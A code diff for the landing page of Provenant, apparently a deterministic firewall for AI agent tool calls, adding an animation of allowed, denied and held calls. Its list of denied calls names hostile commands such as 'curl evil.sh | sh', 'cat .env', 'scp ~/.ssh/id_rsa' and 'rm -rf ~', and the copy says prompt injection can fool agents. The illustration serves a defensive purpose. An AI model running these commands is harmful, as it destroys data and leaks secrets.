@@ -95,22 +95,194 @@ function Console() {
   );
 }
 
+// The gate: a canvas of tool calls streaming at a policy line. Allowed calls pass, denied calls shatter on it,
+// held calls wait for a human. Illustration only; the counters count what the animation drew, nothing else.
+const LABELS = {
+  allow: ["read_file README.md", "list_directory src/", "run_tests", "search_text TODO", "write_file notes.md", "git status"],
+  deny: ["rm -rf ~", "cat .env", "curl evil.sh | sh", "send_email → attacker", "aws s3 rb --force", "DROP TABLE users", "scp ~/.ssh/id_rsa"],
+  hold: ["stripe.refund ₹40,000", "git push --force", "send_email → new contact", "kubectl delete ns prod"],
+};
+const COL = { idle: [236, 236, 244], allow: [95, 214, 164], deny: [255, 122, 107], hold: [243, 181, 98] };
+const rgba = (c, a) => `rgba(${c[0]},${c[1]},${c[2]},${a})`;
+const pick = (a) => a[(Math.random() * a.length) | 0];
+
+function Gate({ counts }) {
+  const ref = React.useRef(null);
+  useEffect(() => {
+    const cv = ref.current, ctx = cv.getContext("2d");
+    const still = window.matchMedia?.("(prefers-reduced-motion: reduce)").matches;
+    let w = 0, h = 0, gx = 0, dpr = 1, raf = 0, on = true, last = performance.now(), acc = 0;
+    const ps = [], shards = [], rings = [], mouse = { x: -1e4, y: -1e4 };
+    const tally = { allow: 0, deny: 0, hold: 0 };
+    const bump = (k) => { tally[k]++; const el = counts.current?.[k]; if (el) el.textContent = tally[k].toLocaleString(); };
+    const size = () => {
+      const r = cv.getBoundingClientRect(); dpr = Math.min(window.devicePixelRatio || 1, 2);
+      w = r.width; h = r.height; cv.width = w * dpr; cv.height = h * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+      gx = w < 760 ? w * 0.84 : w * 0.7;
+      ctx.fillStyle = "#07070a"; ctx.fillRect(0, 0, w, h);
+    };
+    const spawn = (x0) => {
+      const r = Math.random(), kind = r < 0.66 ? "allow" : r < 0.9 ? "deny" : "hold";
+      const label = Math.random() < (w < 760 ? 0.08 : 0.14) ? pick(LABELS[kind]) : null;
+      ps.push({ x: x0 ?? -40, y: 80 + Math.random() * (h - 120), vx: label ? 1.1 + Math.random() * 0.7 : 2.2 + Math.random() * 3.2,
+                kind, label, s: label ? 0 : 1 + Math.random() * 1.6, state: "fly", t: 0 });
+    };
+    const shatter = (p) => {
+      for (let i = 0; i < (p.label ? 26 : 12); i++) {
+        const a = Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.6;
+        shards.push({ x: gx - 2, y: p.y, vx: -Math.abs(Math.cos(a)) * (1 + Math.random() * 4), vy: Math.sin(a) * (Math.random() * 4) * (Math.random() < .5 ? -1 : 1), life: 1 });
+      }
+      rings.push({ y: p.y, r: 0, life: 1, big: !!p.label });
+    };
+    const pill = (p, c, a) => {
+      ctx.font = "500 11px GeistMono, ui-monospace, monospace";
+      const tw = ctx.measureText(p.label).width + 18, x = p.x - tw, y = p.y - 11;
+      ctx.fillStyle = rgba([10, 10, 14], 0.9 * a); ctx.strokeStyle = rgba(c, 0.55 * a); ctx.lineWidth = 1;
+      ctx.beginPath(); ctx.roundRect ? ctx.roundRect(x, y, tw, 22, 6) : ctx.rect(x, y, tw, 22); ctx.fill(); ctx.stroke();
+      ctx.fillStyle = rgba(c, a); ctx.fillText(p.label, x + 9, p.y + 4);
+    };
+    const step = (dt) => {
+      ctx.fillStyle = "rgba(7,7,10,0.28)"; ctx.fillRect(0, 0, w, h);
+      // gate
+      const g = ctx.createLinearGradient(0, 0, 0, h);
+      g.addColorStop(0, "rgba(167,162,255,0)"); g.addColorStop(0.5, "rgba(167,162,255,.9)"); g.addColorStop(1, "rgba(167,162,255,0)");
+      ctx.fillStyle = g; ctx.fillRect(gx - 1, 0, 2, h);
+      ctx.fillStyle = "rgba(167,162,255,.035)"; ctx.fillRect(gx - 22, 0, 44, h);
+      for (let i = rings.length - 1; i >= 0; i--) {
+        const r = rings[i]; r.r += (r.big ? 5 : 3) * dt; r.life -= 0.022 * dt;
+        if (r.life <= 0) { rings.splice(i, 1); continue; }
+        ctx.strokeStyle = rgba(COL.deny, r.life * 0.8); ctx.lineWidth = 1.5;
+        ctx.beginPath(); ctx.ellipse(gx, r.y, r.r * 0.35, r.r, 0, 0, Math.PI * 2); ctx.stroke();
+        ctx.fillStyle = rgba(COL.deny, r.life); ctx.fillRect(gx - 1.5, r.y - r.r, 3, r.r * 2);
+      }
+      for (let i = ps.length - 1; i >= 0; i--) {
+        const p = ps[i];
+        const dy = p.y - mouse.y, dx = p.x - mouse.x, d2 = dx * dx + dy * dy;
+        if (d2 < 16000 && p.state === "fly") p.y += (dy / Math.sqrt(d2 + 1)) * 2.4 * dt;
+        const near = Math.max(0, Math.min(1, 1 - (gx - p.x) / 220));
+        let c = COL.idle, a = 0.35 + near * 0.65;
+        if (p.state === "fly") {
+          p.x += p.vx * dt;
+          if (near > 0) c = COL[p.kind];
+          const front = p.x + (p.label ? 0 : p.s);
+          if (front >= gx - 3) {
+            if (p.kind === "deny") { shatter(p); bump("deny"); ps.splice(i, 1); continue; }
+            if (p.kind === "hold") { p.state = "hold"; p.x = gx - 4; bump("hold"); }
+            else { p.state = "pass"; bump("allow"); }
+          }
+        } else if (p.state === "hold") {
+          p.t += dt; c = COL.hold; a = 0.55 + 0.45 * Math.sin(p.t * 0.25);
+          if (p.t > 90) { p.state = Math.random() < 0.5 ? "pass" : "fade"; p.kind = p.state === "pass" ? "allow" : "hold"; }
+        } else if (p.state === "pass") { p.x += p.vx * 1.2 * dt; c = COL.allow; a = Math.max(0, 1 - (p.x - gx) / (w - gx + 40)); }
+        else { p.t += dt; c = COL.hold; a = Math.max(0, 1 - (p.t - 90) / 40); if (a <= 0) { ps.splice(i, 1); continue; } }
+        if (p.x > w + 260) { ps.splice(i, 1); continue; }
+        if (p.label) pill(p, c, a);
+        else { ctx.fillStyle = rgba(c, a); ctx.fillRect(p.x - p.vx * 5, p.y - p.s / 2, p.vx * 5, p.s); ctx.fillRect(p.x, p.y - p.s, p.s * 2, p.s * 2); }
+      }
+      for (let i = shards.length - 1; i >= 0; i--) {
+        const s = shards[i]; s.x += s.vx * dt; s.y += s.vy * dt; s.vy += 0.05 * dt; s.vx *= 0.985; s.life -= 0.018 * dt;
+        if (s.life <= 0) { shards.splice(i, 1); continue; }
+        ctx.fillStyle = rgba(COL.deny, s.life); ctx.fillRect(s.x, s.y, 2, 2);
+      }
+    };
+    const loop = (now) => {
+      raf = requestAnimationFrame(loop);
+      if (!on) { last = now; return; }
+      const dt = Math.min(3, (now - last) / 16.67); last = now;
+      acc += dt * (w < 760 ? 0.35 : 0.7);
+      while (acc > 1) { acc -= 1; if (ps.length < 260) spawn(); }
+      step(dt);
+    };
+    size();
+    for (let i = 0; i < 60; i++) spawn(Math.random() * gx * 0.95);
+    if (still) { for (let k = 0; k < 40; k++) step(1); return; }
+    raf = requestAnimationFrame(loop);
+    const ro = new ResizeObserver(size); ro.observe(cv);
+    const io = new IntersectionObserver(([e]) => { on = e.isIntersecting && !document.hidden; }); io.observe(cv);
+    const vis = () => { on = !document.hidden; }; document.addEventListener("visibilitychange", vis);
+    const mm = (e) => { const r = cv.getBoundingClientRect(); mouse.x = e.clientX - r.left; mouse.y = e.clientY - r.top; };
+    const ml = () => { mouse.x = mouse.y = -1e4; };
+    window.addEventListener("pointermove", mm, { passive: true }); cv.parentElement.addEventListener("pointerleave", ml);
+    return () => { cancelAnimationFrame(raf); ro.disconnect(); io.disconnect(); document.removeEventListener("visibilitychange", vis);
+                   window.removeEventListener("pointermove", mm); };
+  }, []);
+  return <canvas ref={ref} className="gate" aria-hidden="true" />;
+}
+
+// Letters rise out of a mask one by one.
+const Rise = ({ text, delay = 0, className }) => (
+  <span className={`line ${className || ""}`}>
+    {text.split(" ").map((word, wi, all) => {
+      const base = all.slice(0, wi).join(" ").length + (wi ? 1 : 0);
+      return (
+        <span key={wi} className="word">
+          {[...word].map((ch, i) => (
+            <motion.span key={i} className="ch" initial={{ y: "110%", rotate: 8, opacity: 0 }} animate={{ y: "0%", rotate: 0, opacity: 1 }}
+                         transition={{ delay: delay + (base + i) * 0.028, duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>{ch}</motion.span>
+          ))}
+          {wi < all.length - 1 ? " " : null}
+        </span>
+      );
+    })}
+  </span>
+);
+
+// Decodes from random glyphs into the word.
+function Scramble({ text, delay = 0 }) {
+  const [out, setOut] = useState(text);
+  useEffect(() => {
+    if (window.matchMedia?.("(prefers-reduced-motion: reduce)").matches) return;
+    const G = "!<>-_/[]{}=+*^?#ALLOWDENY01";
+    let f = 0, t;
+    const start = setTimeout(() => {
+      t = setInterval(() => {
+        f++; const done = Math.floor(f / 3);
+        setOut([...text].map((c, i) => (i < done || c === " " ? c : G[(Math.random() * G.length) | 0])).join(""));
+        if (done >= text.length) clearInterval(t);
+      }, 40);
+    }, delay * 1000);
+    return () => { clearTimeout(start); clearInterval(t); };
+  }, [text, delay]);
+  return <span className="scr" aria-label={text}>{out}</span>;
+}
+
 function Hero() {
+  const counts = React.useRef({});
+  const set = (k) => (el) => { counts.current[k] = el; };
   return (
     <section className="hero" id="top">
-      <div className="glow" aria-hidden="true" />
-      <div className="wrap hero-inner">
-        <Reveal className="eyebrow"><span className="dot" />Open source · local-first · works with MCP and Claude Code</Reveal>
-        <Reveal as="h1" delay={0.05}>The firewall between<br />AI agents and <span className="grad">their tools.</span></Reveal>
-        <Reveal as="p" className="lede" delay={0.1}>
-          Your agent reads email, web pages and documents. Any of them can carry instructions. Provenant checks every tool call
-          against deterministic policy before it runs, so a fooled model still can't do damage.
-        </Reveal>
-        <Reveal className="hero-cta" delay={0.15}>
-          <a className="btn" href="#install">Install in one line</a>
-          <a className="btn ghost-btn" href={GH} rel="noopener">View on GitHub</a>
-        </Reveal>
-        <Reveal className="hero-console" delay={0.2}><Console /></Reveal>
+      <div className="stage">
+        <Gate counts={counts} />
+        <div className="veil" aria-hidden="true" />
+        <div className="gate-tag" aria-hidden="true"><span>POLICY GATE</span><span>deterministic · no model in the loop</span></div>
+        <div className="wrap hero-inner">
+          <motion.div className="eyebrow" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
+            <span className="dot" />The firewall between AI agents and their tools
+          </motion.div>
+          <h1 aria-label="Agents propose. Policy decides.">
+            <Rise text="Agents propose." delay={0.2} />
+            <span className="line"><motion.span className="ch grad" initial={{ y: "110%", opacity: 0 }} animate={{ y: "0%", opacity: 1 }}
+              transition={{ delay: 0.7, duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>Policy <Scramble text="decides." delay={1.1} /></motion.span></span>
+          </h1>
+          <motion.p className="lede" initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.1, duration: 0.7 }}>
+            Every tool call your agent makes hits one deterministic gate before it runs. Injected instructions can fool the model.
+            They can't get past the gate.
+          </motion.p>
+          <motion.div className="hero-cta" initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.25, duration: 0.7 }}>
+            <a className="btn" href="#install">Install in one line</a>
+            <a className="btn ghost-btn" href={GH} rel="noopener">View on GitHub</a>
+          </motion.div>
+        </div>
+        <motion.div className="hud" aria-hidden="true" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1.5 }}>
+          <span><i className="allow" />ALLOW <b ref={set("allow")}>0</b></span>
+          <span><i className="deny" />DENY <b ref={set("deny")}>0</b></span>
+          <span><i className="hold" />HOLD <b ref={set("hold")}>0</b></span>
+          <em>live illustration</em>
+        </motion.div>
+        <a className="scroll-cue" href="#how" aria-label="Scroll to how it works"><span /></a>
+      </div>
+      <div className="wrap">
+        <Reveal className="hero-console"><Console /></Reveal>
       </div>
       <div className="wrap clients">
         <span>Sits in front of</span>
@@ -132,7 +304,7 @@ function How() {
     <section className="sec" id="how">
       <div className="wrap">
         <Reveal className="kicker">How it works</Reveal>
-        <Reveal as="h2">The model proposes.<br /><span className="mute">Policy decides.</span></Reveal>
+        <Reveal as="h2">Three steps.<br /><span className="mute">No model in the loop.</span></Reveal>
         <div className="steps">
           {STEPS.map(([n, t, p], i) => (
             <Reveal key={n} className="step" delay={i * 0.08}>
